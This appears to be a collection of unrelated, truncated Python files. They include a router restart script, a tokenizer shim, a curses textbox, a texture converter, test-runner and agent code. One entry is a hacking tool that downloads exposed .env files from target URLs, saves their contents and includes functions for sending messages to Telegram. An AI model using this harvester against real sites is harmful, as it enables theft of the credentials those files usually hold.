'html.parser')\n# template = soup.select_one('#template_RestartManag')\n\n# if template:\n#     print(\"Template found:\", template)\n# else:\n#     print(\"Template not found!\")\n\n\n\n\ntmpToken = extract_session_token(resp)\n\nprint(\"tmp2:\",tmpToken)\n\n\n\n# template = $('#template_RestartManag')\n# \u00c7ALI\u015eTI: dataPost(\"Restart\", \"fillDataByRestartResult\", \"/common_page/deviceManag_lua.lua\", template, undefined, false);\n\n# URL (Server Address)\nparams = {\n    \"IF_ACTION\": \"Restart\",\n    \"Btn_restart\": \"\",\n    \"_sessionTOKEN\": tmpToken\n}\nurl = \"http://192.168.1.1/common_page/deviceManag_lua.lua\"\nparams_str = \"&\".join([f\"{key}={value}\" for key, value in params.items()])\nhashed = hashlib.sha256(params_str.encode())\n\n# 5b375bdf08e10f6e7d5682d2530104213fc87e88232a5fe10b22c2a8494166d2\nprint(hashed.hexdigest())\nheaders = {\n    \"Check\": hashed.hexdigest()\n}\n\nresponse = session.post(url, data=params, headers=headers)\n\nif response.status_code == 200:\n    print(\"Restart request successful!\")\n    print(response.text)\nelse:\n    print(\"Restart request failed! Sta",
    "\"\"\"Shim for transformers.AutoTokenizer.\"\"\"\n\nfrom functools import cache\nfrom pathlib import Path\nfrom typing import Any, TypedDict\n\nfrom huggingface_hub import hf_hub_download\nfrom tokenizers import Tokenizer\n\n\nclass BatchEncoding(TypedDict):\n    input_ids: list[list[int]]\n    attention_mask: list[list[int]]\n    offset_mapping: list[list[tuple[int, int]]]\n\n\nclass XLMRobertaTokenizerFast:\n    \"\"\"A fast transformers.XLMRobertaTokenizerFast interface for wtpsplit.\"\"\"\n\n    def __init__(  # noqa: PLR0913\n        self,\n        tokenizer: Tokenizer,\n        bos_token: str = \"<s>\",  # noqa: S107\n        eos_token: str = \"</s>\",  # noqa: S107\n        sep_token: str = \"</s>\",  # noqa: S107\n        cls_token: str = \"<s>\",  # noqa: S107\n        unk_token: str = \"<unk>\",  # noqa: S107\n        pad_token: str = \"<pad>\",  # noqa: S107\n        mask_token: str = \"<mask>\",  # noqa: S107\n    ):\n        self.tokenizer = tokenizer\n        self.bos_token = bos_token\n        self.eos_token = eos_token\n        self.sep_token = sep_token\n        self.cls_token = cls_token\n        self.unk_token = unk_token\n        self.pad_token = pad_token\n        self.mask_token = mask_token\n        self.bos_token_id = self.tokenizer.token_to_id(bos_token)\n        self.eos_token_id = self.tokenizer.token_to_id(eos_token)\n        self.sep_token_id = self.tokenizer.token_to_id(sep_token)\n        self.cls_token_id = self.tokenizer.token_to_id(cls_token)\n        self.unk_token_id = self.tokenizer.token_to_id(unk_token)\n        self.pad_token_id = self.tokenizer.token_to_id(pad_token)\n        self.mask_token_id = self.tokenizer.token_to_id(mask_token)\n\n    def __call__(\n        self,\n        texts: list[str],\n        is_pretokenized: bool = False,  # noqa: FBT001, FBT002\n        add_special_tokens: bool = True,  # noqa: FBT001, FBT002\n        return_offsets_mapping: bool = True,  # noqa: FBT001, FBT002\n        verbose: bool = False,  # noqa: FBT001, FBT002\n        **kwargs: Any,\n    ) -> BatchEncoding:\n        encoded_batch = self.tokenizer.encode_batch(\n            texts, is_pretokenized=is_pretokenized, add_special_tokens=add_special_tokens\n        )\n        return BatchEncoding(\n            input_ids=[e.ids for e in encoded_batch],\n            attention_mask=[e.attention_mask for e in encoded_batch],\n            offset_mapping=[e.offsets for e in encoded_batch],\n        )\n\n    @classmethod\n    @cache\n    def from_pretrained(cls, pretrained_model_name_or_path: str) -> \"XLMRobertaTokenizerFast\":\n        is_local = Path.is_file(Path(pretrained_model_name_or_path))\n        tokenizer_filepath = Path(\n            pretrained_model_name_or_path\n            if is_local\n            else hf_hub_download(pretrained_model_name_or_path, \"tokenizer.json\")\n        )\n        tokenizer = Tokenizer.from_file(tokenizer_filepath.as_posix())\n        return cls(tokenizer)\n",
    "import os\r\nimport requests\r\nfrom bs4 import BeautifulSoup\r\nfrom colorama import Fore, Style\r\nimport argparse\r\nimport json\r\nfrom xml.etree import ElementTree as ET\r\nimport shutil  # For terminal window width\r\n\r\n\"\"\"\r\n          #Author  : Hackfut\r\n          #Contact : t.me/H4ckfutSec\r\n          #Github  : https://github.com/HackfutSec\r\n          #License : MIT  \r\n          [Warning] I am not responsible for the way you will use this program [Warning]\r\n\r\n\"\"\"\r\n# Banner Text\r\nbanner = \"\"\"\r\n\r\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2557\u2588\u2588\u2557\u2591\u2591\u2591\u2588\u2588\u2557\r\n\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\r\n\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2554\u2588\u2588\u2557\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2591\u2588\u2588\u2554\u255d\r\n\u2588\u2588\u2554\u2550\u2550\u255d\u2591\u2591\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2551\u2591\u255a\u2588\u2588\u2588\u2588\u2554\u255d\u2591\r\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2591\u255a\u2588\u2588\u2588\u2551\u2591\u2591\u255a\u2588\u2588\u2554\u255d\u2591\u2591\r\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d\u2591\u2591\u255a\u2550\u2550\u255d\u2591\u2591\u2591\u255a\u2550\u255d\u2591\u2591\u2591\r\n\ud83c\udd54\ud83c\udd5d\ud83c\udd65 \ud83c\udd54\ud83c\udd5d\ud83c\udd65 \ud83c\udd54\ud83c\udd5d\ud83c\udd65 \ud83c\udd54\ud83c\udd5d\ud83c\udd65 \ud83c\udd54\ud83c\udd5d\ud83c\udd65 \ud83c\udd54\ud83c\udd5d\ud83c\udd65 \ud83c\udd54\ud83c\udd5d\ud83c\udd65\r\n\r\nDescription:\r\n         Program to retrieve and display the content of a .env file.\r\n\r\n\"\"\"\r\n\r\n# Function to clear the terminal and display the banner centered\r\ndef clear_and_display_banner():\r\n    os.system('cls' if os.name == 'nt' else 'clear')  # Clear the terminal\r\n    terminal_width = shutil.get_terminal_size().columns  # Get terminal width\r\n    centered_banner = '\\n'.join(line.center(terminal_width) for line in banner.splitlines())  # Center the banner\r\n    print(Fore.GREEN + centered_banner + Style.RESET_ALL)  # Display the banner in green color\r\n\r\n# Function to display the content of a .env file from a URL\r\ndef display_content_from_url(url, headers, auth=None, retries=3):\r\n    for attempt in range(retries):\r\n        try:\r\n            response = requests.get(url, headers=headers, auth=auth, timeout=5)\r\n            response.raise_for_status()  # Check for HTTP errors (e.g., 404, 500)\r\n            if response.status_code == 200:\r\n                print(Fore.GREEN + f\"\\n[\u2713] Content found at the following URL: {url}\" + Style.RESET_ALL)\r\n                content = response.text\r\n\r\n                # Use BeautifulSoup to extract the plain text from the HTML page\r\n                soup = BeautifulSoup(content, 'html.parser')\r\n                page_text = soup.get_text(separator='\\n', strip=True)  # Extract all visible text from the page\r\n\r\n                print(\"\\nHTML page content (only visible text):\")\r\n                print(page_text)  # Display the full content without pagination\r\n                return page_text\r\n        except requests.Timeout:\r\n            print(Fore.RED + f\"\\n[\u2718] The request timed out for {url}. Attempt {attempt + 1}/{retries}...\" + Style.RESET_ALL)\r\n        except requests.RequestException as err:\r\n            print(Fore.RED + f\"\\n[\u2718] Error connecting to URL: {url}. Error: {err}\" + Style.RESET_ALL)\r\n        break\r\n    return None\r\n\r\n# Function to save content to a file\r\ndef save_to_file(content, filename=\"env.txt\"):\r\n    try:\r\n        with open(filename, 'a') as file:  # 'a' to append without overwriting the existing content\r\n            file.write(content + \"\\n\\n\")\r\n        print(Fore.GREEN + f\"\\n[\u2713] Results saved to {filename}\" + Style.RESET_ALL)\r\n    except Exception as e:\r\n        print(Fore.RED + f\"\\n[\u2718] Error saving to the file: {e}\" + Style.RESET_ALL)\r\n\r\n# Function to read links from a file\r\ndef read_urls_from_file(file_path):\r\n    if not os.path.exists(file_path):\r\n        print(Fore.RED + f\"\\n[\u2718] The file {file_path} does not exist.\" + Style.RESET_ALL)\r\n        return []\r\n    \r\n    with open(file_path, 'r') as file:\r\n        urls = file.readlines()\r\n    \r\n    return [url.strip() for url in urls if url.strip()]\r\n\r\n# Function to send a message to Telegram\r\ndef send_telegram_message(bot_token, chat_id, message):\r\n    url = f\"https://api.telegram.org/bot{bot_token}/sendMessage\"\r\n    params = {\r\n        \"chat_id\": chat_id,\r\n        \"text\": message\r\n    }\r\n    try:\r\n        response = requests.post(url, params=params)\r\n        if response.status_code == 200:\r\n            print(Fore.GREEN + \"\\n[\u2713] Message sent to Telegram.\" + Style.RESET_ALL)\r\n        else:\r\n            print(Fore.RED + \"\\n[\u2718] Error sending message to Telegram.\" + Style.RESET_ALL)\r\n    except requests.RequestException as err:\r\n        print(Fore.RED + f\"\\n[\u2718] Error sending message to Telegram: {err}\" + Style.RESET_ALL)\r\n\r\n# Function to check the validity of the chat_id in Telegram\r\ndef is_valid_chat_id(bot_token, chat_id):\r\n    url = f\"https://api.telegram.org/bot{bot_token}/getChat?chat_id={chat_id}\"\r\n    try:\r\n        response = requests.get(url)\r\n        return response.status_code == 200\r\n    except requests.RequestException as err:\r\n        print(Fore.RED + f\"\\n[\u2718] Error validating chat_id: {err}\" + Style.RESET_ALL)\r\n        return False\r\n\r\n# Function to display help for the program\r\ndef print_help():\r\n    help_text = Fore.GREEN + \"\"\"\r\n\r\n       [1] Test a single link.\r\n       [2] Test a file containing multiple links.\r\n       [4 ] Exit the program.\r\n\r\n    \"\"\"\r\n    print(help_text)\r\n\r\n# Function to parse command-line arguments\r\ndef parse_args():\r\n    parser = argparse.ArgumentParser(description=\"Program to retrieve and display the content of a .env file.\")\r\n    parser.add_argument('--lines-per-page', type=int, default=20, help='Number of l",
    "#!/usr/bin/env python3\nfrom dataclasses import dataclass\n\nfrom lox.token_type import TokenType\n\n\n@dataclass(frozen=True)\nclass Token:\n    \"\"\"Scanner Token\n\n    A Token represents a \"chunk\" of text within the processed source code. These\n    are returned by the Scanner and consumed by the Parser.\n\n    For example:\n    var a = 2;\n\n    Has 5 Tokens:\n    Scanner(\"var a = 2;\").scan_tokens()\n    Token(TokenType.VAR,        \"var\", None, 1)\n    Token(TokenType.IDENTIFIER, \"a\",   None, 1)\n    Token(TokenType.EQUALS,     \"=\",   None, 1)\n    Token(TokenType.NUMBER,     \"2\",   2.0,  1)\n    Token(TokenType.SEMICOLON,  \";\",   None, 1)\n\n    Args:\n        type: TokenType. The type of Token being identified, see the TokenType\n            enum for possible types.\n        lexeme: str. Scanned source contents representing this Token.\n        literal: object. Eagerly evaluated Python representation of the lexeme\n            if any, otherwise None.\n        line: int. The line in the source code where this Token was scanned.\n    \"\"\"\n\n    type: TokenType\n    lexeme: str\n    literal: object\n    line: int\n\n    def __repr__(self) -> str:\n        return self.to_string()\n\n    def to_string(self) -> str:\n        return str(self.type) + \" \" + self.lexeme + \" \" + str(self.literal)\n",
    "\"\"\"Simple textbox editing widget with Emacs-like keybindings.\"\"\"\n\nimport curses\nimport curses.ascii\n\ndef rectangle(win, uly, ulx, lry, lrx):\n    \"\"\"Draw a rectangle with corners at the provided upper-left\n    and lower-right coordinates.\n    \"\"\"\n    win.vline(uly+1, ulx, curses.ACS_VLINE, lry - uly - 1)\n    win.hline(uly, ulx+1, curses.ACS_HLINE, lrx - ulx - 1)\n    win.hline(lry, ulx+1, curses.ACS_HLINE, lrx - ulx - 1)\n    win.vline(uly+1, lrx, curses.ACS_VLINE, lry - uly - 1)\n    win.addch(uly, ulx, curses.ACS_ULCORNER)\n    win.addch(uly, lrx, curses.ACS_URCORNER)\n    win.addch(lry, lrx, curses.ACS_LRCORNER)\n    win.addch(lry, ulx, curses.ACS_LLCORNER)\n\nclass Textbox:\n    \"\"\"Editing widget using the interior of a window object.\n     Supports the following Emacs-like key bindings:\n\n    Ctrl-A      Go to left edge of window.\n    Ctrl-B      Cursor left, wrapping to previous line if appropriate.\n    Ctrl-D      Delete character under cursor.\n    Ctrl-E      Go to right edge (stripspaces off) or end of line (stripspaces on).\n    Ctrl-F      Cursor right, wrapping to next line when appropriate.\n    Ctrl-G      Terminate, returning the window contents.\n    Ctrl-H      Delete character backward.\n    Ctrl-J      Terminate if the window is 1 line, otherwise insert newline.\n    Ctrl-K      If line is blank, delete it, otherwise clear to end of line.\n    Ctrl-L      Refresh screen.\n    Ctrl-N      Cursor down; move down one line.\n    Ctrl-O      Insert a blank line at cursor location.\n    Ctrl-P      Cursor up; move up one line.\n\n    Move operations do nothing if the cursor is at an edge where the movement\n    is not possible.  The following synonyms are supported where possible:\n\n    KEY_LEFT = Ctrl-B, KEY_RIGHT = Ctrl-F, KEY_UP = Ctrl-P, KEY_DOWN = Ctrl-N\n    KEY_BACKSPACE = Ctrl-h\n    \"\"\"\n    def __init__(self, win, insert_mode=False):\n        self.win = win\n        self.insert_mode = insert_mode\n        self._update_max_yx()\n        self.stripspaces = 1\n        self.lastcmd = None\n        win.keypad(1)\n\n    def _update_max_yx(self):\n        maxy, maxx = self.win.getmaxyx()\n        self.maxy = maxy - 1\n        self.maxx = maxx - 1\n\n    def _end_of_line(self, y):\n        \"\"\"Go to the location of the first blank on the given line,\n        returning the index of the last non-blank character.\"\"\"\n        self._update_max_yx()\n        last = self.maxx\n        while True:\n            if curses.ascii.ascii(self.win.inch(y, last)) != curses.ascii.SP:\n                last = min(self.maxx, last+1)\n                break\n            elif last == 0:\n                break\n            last = last - 1\n        return last\n\n    def _insert_printable_char(self, ch):\n        self._update_max_yx()\n        (y, x) = self.win.getyx()\n        backyx = None\n        while y < self.maxy or x < self.maxx:\n            if self.insert_mode:\n                oldch = self.win.inch()\n            # The try-catch ignores the error we trigger from some curses\n            # versions by trying to write into the lowest-rightmost spot\n            # in the window.\n            try:\n                self.win.addch(ch)\n            except curses.error:\n                pass\n            if not self.insert_mode or not curses.ascii.isprint(oldch):\n                break\n            ch = oldch\n            (y, x) = self.win.getyx()\n            # Remember where to put the cursor back since we are in insert_mode\n            if backyx is None:\n                backyx = y, x\n\n        if backyx is not None:\n            self.win.move(*backyx)\n\n    def do_command(self, ch):\n        \"Process a single editing command.\"\n        self._update_max_yx()\n        (y, x) = self.win.getyx()\n        self.lastcmd = ch\n        if curses.ascii.isprint(ch):\n            if y < self.maxy or x < self.maxx:\n                self._insert_printable_char(ch)\n        elif ch == curses.ascii.SOH:                           # ^a\n            self.win.move(y, 0)\n        elif ch in (curses.ascii.STX,curses.KEY_LEFT,\n                    curses.ascii.BS,\n                    curses.KEY_BACKSPACE,\n                    curses.ascii.DEL):\n            if x > 0:\n                self.win.move(y, x-1)\n            elif y == 0:\n                pass\n            elif self.stripspaces:\n                self.win.move(y-1, self._end_of_line(y-1))\n            else:\n                self.win.move(y-1, self.maxx)\n            if ch in (curses.ascii.BS, curses.KEY_BACKSPACE, curses.ascii.DEL):\n                self.win.delch()\n        elif ch == curses.ascii.EOT:                           # ^d\n            self.win.delch()\n        elif ch == curses.ascii.ENQ:                           # ^e\n            if self.stripspaces:\n                self.win.move(y, self._end_of_line(y))\n            else:\n                self.win.move(y, self.maxx)\n        elif ch in (curses.ascii.ACK, curses.KEY_RIGHT):       # ^f\n            if x < self.maxx:\n                self.win.move(y, x+1)\n            elif y == self.maxy:\n                pass\n           ",
    "\"\"\"\nThis script shows the attempt when your fivem client connects to a server\nIt misses some arguments, which I cannot possibly generate alone. \n\nSpecial tokens and additional data that are not included or explained here.\nNote: Misuse of ths script may actually cause you more harm than good.\n\"\"\"\n\nimport requests\n\nserver_address = \"\"  # Put the server IP\nserver_port = \"\"     # Put the server Port (eg. 30120)\n\n# The URL the client creates under the process of joining\nurl = f\"http://{server_address}:{server_port}/client\"\n\n# Headers for the request (From the client too)\nheaders = {\n    \"Host\": f\"{server_address}:{server_port}\",\n    \"User-Agent\": \"CitizenFX/1\",\n    \"Accept\": \"*/*\",\n    \"Content-Type\": \"application/x-www-form-urlencoded\",\n}\n\n# Data payload for the request (Also from the client, who all are needed)\ndata = {\n    \"method\": \"initConnect\", \n    \"gameBuild\": \"\",       # Replace with the game build number\n    \"gameName\": \"gta5\",        # Just the type of game \n    \"guid\": \"\",            # Replace with the GUID\n    \"name\": \"\",            # Replace with the desired player name\n    \"protocol\": \"12\",      # Protocol version\n    \"cfxTicket2\": \"\",      # Replace with a valid token\n    \"cfxTicket\": \"\"        # Replace with a valid token\n}\n\ntry:\n    response = requests.post(url, headers=headers, data=data)\n    print(f\"Status Code: {response.status_code}\")\nexcept requests.RequestException as e:\n    print(f\"An error occurred: {e}\")\n\n# Note: Automating token generation or retrieving the rest of the right arguments is not here. \n# If you figure out a method to do so, let me know asap!\n",
    "import os\nimport logging\nimport signal\nimport time  # Added time module\nfrom PIL import Image\nimport numpy as np\nimport tkinter as tk\nfrom tkinter import filedialog, messagebox\nfrom enum import Enum\nfrom typing import Tuple, Optional, Set\nfrom concurrent.futures import ProcessPoolExecutor, as_completed\nfrom tqdm import tqdm\nfrom functools import lru_cache\n\n# Setup logging\nlogging.basicConfig(level=logging.INFO, format=\"%(asctime)s [%(levelname)s] %(message)s\")\nlogger = logging.getLogger(__name__)\n\ndef handle_exit(signum, frame):\n    logger.info(\"Gracefully shutting down...\")\n    exit(0)\n\nsignal.signal(signal.SIGINT, handle_exit)\nsignal.signal(signal.SIGTERM, handle_exit)\n\nclass TextureType(Enum):\n    NORMAL = \"normal\"\n    DIFFUSE = \"diff\"\n    GLOSS = \"gloss\"\n\nclass TextureProcessor:\n    SUPPORTED_FORMATS: Set[str] = {'.png', '.jpg', '.jpeg', '.tif', '.tiff', '.bmp', '.tga'}\n    DEFAULT_CHUNK_SIZE: int = 1024\n\n    def __init__(self, input_folder: str, max_workers: Optional[int] = None, png_optimize: bool = False):\n        self.input_folder = input_folder\n        self.output_folder = self._get_unique_output_folder()\n        self.max_workers = max_workers if max_workers is not None else os.cpu_count() or 1\n        self.png_optimize = png_optimize\n        os.makedirs(self.output_folder, exist_ok=True)\n        logger.info(f\"Output folder: {self.output_folder}\")\n\n    def _get_unique_output_folder(self) -> str:\n        base_output = os.path.join(self.input_folder, \"converted_textures\")\n        counter = 1\n        while True:\n            output_folder = f\"{base_output}_{counter}\" if counter > 1 else base_output\n            if not os.path.exists(output_folder):\n                os.makedirs(output_folder)\n                return output_folder\n            counter += 1\n\n    @staticmethod\n    @lru_cache(maxsize=None)\n    def _get_texture_type(filename: str) -> Optional[TextureType]:\n        base_name = os.path.splitext(filename)[0].lower()\n        if base_name.endswith(\"_diff\"):\n            return TextureType.DIFFUSE\n        elif base_name.endswith(\"_gloss\"):\n            return TextureType.GLOSS\n        else:\n            return TextureType.NORMAL\n\n    @staticmethod\n    def _process_normal_map(img_array: np.ndarray) -> np.ndarray:\n        processed_array = np.empty_like(img_array, dtype=np.uint8)\n        processed_array[:, :, 0] = img_array[:, :, 3]  # A to R\n        processed_array[:, :, 1] = img_array[:, :, 1]  # G remains\n        processed_array[:, :, 2] = img_array[:, :, 0]  # R to B\n        processed_array[:, :, 3] = 255  # Alpha to 255\n        return processed_array\n\n    @staticmethod\n    def _process_diffuse_map(img_array: np.ndarray) -> Tuple[np.ndarray, np.ndarray]:\n        color_only = np.dstack((img_array[:, :, :3], np.full(img_array.shape[:2], 255, dtype=np.uint8)))\n        alpha_only = np.dstack((img_array[:, :, 3], img_array[:, :, 3], img_array[:, :, 3], np.full(img_array.shape[:2], 255, dtype=np.uint8)))\n        return color_only, alpha_only\n\n    @staticmethod\n    def _process_gloss_map(img_array: np.ndarray) -> np.ndarray:\n        processed_array = np.empty_like(img_array, dtype=np.uint8)\n        processed_array[:, :, :3] = 255 - img_array[:, :, :3]\n        processed_array[:, :, 3] = img_array[:, :, 3]\n        return processed_array\n\n    @staticmethod\n    def _save_image(image_array: np.ndarray, output_path: str, png_optimize: bool):\n        try:\n            Image.fromarray(image_array, 'RGBA').save(output_path, 'PNG', optimize=png_optimize)\n        except Exception as e:\n            logger.error(f\"Failed to save image to {output_path}: {e}\")\n\n    @staticmethod\n    def process_texture(input_path: str, output_folder: str, png_optimize: bool) -> Tuple[bool, Optional[str]]:\n        try:\n            with Image.open(input_path) as img:\n                img = img.convert('RGBA') if img.mode != 'RGBA' else img\n                img_array = np.asarray(img)\n                filename = os.path.basename(input_path)\n                texture_type = TextureProcessor._get_texture_type(filename)\n                base_name = os.path.splitext(filename)[0]\n\n                if texture_type == TextureType.DIFFUSE:\n                    color_array, alpha_array = TextureProcessor._process_diffuse_map(img_array)\n                    color_path = os.path.join(output_folder, f\"{base_name}_color.png\")\n                    alpha_path = os.path.join(output_folder, f\"{base_name}_alpha.png\")\n                    TextureProcessor._save_image(color_array, color_path, png_optimize)\n                    TextureProcessor._save_image(alpha_array, alpha_path, png_optimize)\n                    return (True, color_path)\n                elif texture_type == TextureType.GLOSS:\n                    processed_array = TextureProcessor._process_gloss_map(img_array)\n                    output_path = os.path.join(output_folder, f\"{base_name}_roughness.png\")\n                    TextureProcessor._save_image(processed_array, output_path, png_optimize)\n                e",
    "\nfrom difflib import get_close_matches\nfrom typing import Set\n\ndef get_fuzzy_matches(word: str, vocabulary: Set[str], cutoff: float = 0.75) -> bool:\n    \"\"\"\n    Check if a word closely matches any word in the vocabulary using fuzzy matching\n    \"\"\"\n    return bool(get_close_matches(word, vocabulary, n=1, cutoff=cutoff))\n\ndef is_flight_related_query(query: str) -> bool:\n    \"\"\"\n    Enhanced check for flight-related queries using fuzzy matching for typo tolerance\n    \"\"\"\n    # Core flight-related keywords\n    flight_keywords = {\n        'flight', 'air', 'airline', 'airport', 'airways',\n        'travel', 'trip', 'journey',\n        'destination', 'dest',\n        'origin', 'route', 'path', 'connection',\n        'price', 'fare', 'cost', 'expensive', 'cheap',\n        'direct', 'nonstop', 'connecting',\n        'departure', 'arrive', 'arriving', 'departing',\n        'domestic', 'international'\n    }\n\n    # Location indicators that strongly suggest a flight query\n    location_indicators = {'from', 'to', 'between', 'via'}\n\n    # Clean and tokenize the query\n    query = query.lower().strip()\n    query_words = query.split()\n\n    # Check each word in the query for fuzzy matches\n    for word in query_words:\n        # Exact match for location indicators\n        if word in location_indicators:\n            return True\n\n        # Fuzzy match for flight keywords\n        if get_fuzzy_matches(word, flight_keywords):\n            return True\n\n    # Check for price indicators\n    if any(char in query for char in ['\u20b9', '$', '\u20ac']):\n        return True\n\n    return False\n",
    "from rubpy import Client\nimport asyncio\nimport os\n\n\nasync def main():\n    try:\n        async with Client(name='rubpy', display_welcome=False) as bot:\n            files = {\n                \"profile_img\": \"img1.jpg\",  # \u0639\u06a9\u0633 \u067e\u0631\u0648\u0641\u0627\u06cc\u0644 \u0627\u0635\u0644\u06cc\n                \"thumb_img\": \"img2.jpg\"     # \u0639\u06a9\u0633\u06cc \u06a9\u0647 \u0627\u0632 \u0628\u06cc\u0631\u0648\u0646 \u0645\u06cc\u062e\u0648\u0627\u06cc\u0646 \u0628\u0628\u06cc\u0646\u06cc\u0646\n            }\n            \n            for file_name, file_path in files.items():\n                if not os.path.exists(file_path):\n                    raise FileNotFoundError(f\"\u0641\u0627\u06cc\u0644 {file_path} \u06cc\u0627\u0641\u062a \u0646\u0634\u062f.\")\n            \n            profile_res = await bot.upload(files[\"profile_img\"])\n            thumb_res = await bot.upload(files[\"thumb_img\"])\n            \n            profile_id = profile_res[\"file_id\"]\n            thumb_id = thumb_res[\"file_id\"]\n            \n            me = await bot.get_me()\n            guid = me[\"user\"][\"user_guid\"]\n            \n            upload_data = {\n                \"object_guid\": guid,\n                \"thumbnail_file_id\": thumb_id,\n                \"main_file_id\": profile_id,\n            }\n            \n            result = await bot.builder(name='uploadAvatar', input=upload_data)\n\n            if result:\n                print(\"\u067e\u0631\u0648\u0641\u0627\u06cc\u0644 \u0648 \u062a\u0627\u0645\u0628\u0646\u06cc\u0644 \u0622\u067e\u0644\u0648\u062f \u0634\u062f\u0646\u062f\")\n   \n    except Exception as e:\n        print(f\"\u062e\u0637\u0627: {e}\")\n\n\nasyncio.run(main()) \n",
    "import os\nimport sys\nimport argparse\nimport logging\nfrom collections import Counter\n\ntry:\n    from colorama import init as colorama_init, Fore, Style\n    colorama_init(autoreset=True)\nexcept ImportError:\n    class _FallbackFore:\n        RED = GREEN = YELLOW = MAGENTA = CYAN = \"\"\n    class _FallbackStyle:\n        RESET_ALL = \"\"\n    Fore = _FallbackFore()\n    Style = _FallbackStyle()\n\nfrom . import __version__\nfrom .core import (\n    create_live_console_handler,\n    SimpleLogFormatter,\n    run_tests\n)\n\ndef console_main():\n    parser = argparse.ArgumentParser(\n        prog=\"micropytest\",\n        description=\"micropytest - 'pytest but smaller, simpler, and smarter'.\"\n    )\n    parser.add_argument(\"--version\", action=\"store_true\",\n                        help=\"Show micropytest version and exit.\")\n\n    parser.add_argument(\"path\", nargs=\"?\", default=\".\")\n    parser.add_argument(\"-v\", \"--verbose\", action=\"store_true\", help=\"More logs.\")\n    parser.add_argument(\"-q\", \"--quiet\",   action=\"store_true\", help=\"Quiet mode.\")\n    args = parser.parse_args()\n\n    # If --version is requested, just print it and exit\n    if args.version:\n        print(__version__)\n        sys.exit(0)\n\n    if args.verbose and args.quiet:\n        parser.error(\"Cannot use both -v and -q together.\")\n\n    # root logger\n    root_logger = logging.getLogger()\n\n    # Create our formatter and handler\n    live_format = SimpleLogFormatter()\n    live_handler = create_live_console_handler(formatter=live_format)\n\n    # If quiet => set level above CRITICAL (so no logs) and skip attaching the handler\n    if args.quiet:\n        root_logger.setLevel(logging.CRITICAL + 1)\n    elif args.verbose:\n        root_logger.setLevel(logging.DEBUG)\n        root_logger.addHandler(live_handler)\n    else:\n        root_logger.setLevel(logging.INFO)\n        root_logger.addHandler(live_handler)\n\n    # Only show estimates if not quiet\n    show_estimates = not args.quiet\n\n    # Log version only if not quiet (or if you want to keep it, you can remove the condition)\n    if not args.quiet:\n        logging.info(\"micropytest version: {}\".format(__version__))\n\n    # Run tests\n    test_results = run_tests(tests_path=args.path, show_estimates=show_estimates)\n\n    # Count outcomes\n    passed = sum(r[\"status\"] == \"pass\" for r in test_results)\n    skipped = sum(r[\"status\"] == \"skip\" for r in test_results)\n    total = len(test_results)\n    failed = total - (passed + skipped)\n\n    # Tally warnings/errors from logs\n    log_counter = Counter()\n    for outcome in test_results:\n        for (lvl, msg) in outcome[\"logs\"]:\n            log_counter[lvl] += 1\n    warnings_count = log_counter[\"WARNING\"]\n    errors_count   = log_counter[\"ERROR\"] + log_counter[\"CRITICAL\"]\n\n    # If not quiet, we print the fancy ASCII summary and per-test lines\n    if not args.quiet:\n        print(r\"\"\"\n        _____    _______        _\n       |  __ \\  |__   __|      | |\n  _   _| |__) |   _| | ___  ___| |_\n | | | |  ___/ | | | |/ _ \\/ __| __|\n | |_| | |   | |_| | |  __/\\__ \\ |_\n | ._,_|_|    \\__, |_|\\___||___/\\__|\n | |           __/ |\n |_|          |___/           Report\n \"\"\")\n\n        # Show each test's line\n        for outcome in test_results:\n            status = outcome[\"status\"]\n            if status == \"pass\":\n                color_status = Fore.GREEN + \"PASS\"\n            elif status == \"skip\":\n                color_status = Fore.MAGENTA + \"SKIP\"\n            else:\n                color_status = Fore.RED + \"FAIL\"\n\n            duration_s = outcome[\"duration_s\"]\n            testkey = \"{}::{}\".format(\n                os.path.basename(outcome[\"file\"]),\n                outcome[\"test\"]\n            )\n\n            duration_str = \"\"\n            if duration_s > 0.01:\n                duration_str = \" in {:.2g} seconds\".format(duration_s)\n            print(\"{:50s} - {}{}{}\".format(\n                testkey, color_status, Style.RESET_ALL, duration_str)\n            )\n\n            if args.verbose:\n                for (lvl, msg) in outcome[\"logs\"]:\n                    print(\"  {}\".format(msg))\n                if outcome[\"artifacts\"]:\n                    print(\"  Artifacts: {}\".format(outcome[\"artifacts\"]))\n                print()\n\n    # Build the final summary line for both quiet and non-quiet modes\n    def plural(count, singular, plural_form):\n        return singular if count == 1 else plural_form\n\n    total_str = \"{} {}\".format(total, plural(total, \"test\", \"tests\"))\n\n    summary_chunks = []\n    if passed > 0:\n        summary_chunks.append(\"{}{} passed{}\".format(Fore.GREEN, passed, Style.RESET_ALL))\n    if skipped > 0:\n        summary_chunks.append(\"{}{} skipped{}\".format(Fore.MAGENTA, skipped, Style.RESET_ALL))\n    if failed > 0:\n        summary_chunks.append(\"{}{} failed{}\".format(Fore.RED, failed, Style.RESET_ALL))\n    if warnings_count > 0:\n        summary_chunks.append(\"{}{} warning{}{}\".format(\n            Fore.YELLOW, warnings_count,\n            \"\" if warnings_count == 1 else \"s\",\n            Style.RESET_ALL\n        ))\n    if err",
    "import ast\nimport base64\nimport os\nimport shutil\nimport time\nfrom dataclasses import dataclass\nfrom datetime import datetime\nfrom typing import Dict, List, Optional, Tuple, Union\n\nimport requests\nfrom playwright.async_api import Page, async_playwright\nfrom pydantic import BaseModel\n\nfrom .index import RAGSystem\nfrom .agent import fetch_query_for_rag, get_reply, summarize_text\n\n\ndef call_process_image_api(\n    image_path, box_threshold=0.05, iou_threshold=0.1, timeout=30\n):\n    start = time.time()\n    url = os.environ.get(\"OMNIPARSER_API\")\n    with open(image_path, \"rb\") as image_file:\n        image_data = image_file.read()\n\n    files = {\"image_file\": (\"image.png\", image_data, \"image/png\")}\n    params = {\"box_threshold\": box_threshold, \"iou_threshold\": iou_threshold}\n\n    response = requests.post(url, files=files, params=params, timeout=timeout)\n\n    if response.status_code == 200:\n        resp = response.json()\n        print(f\"Image API call took: {time.time() - start:.2f}s\")\n        return resp[\"image\"], 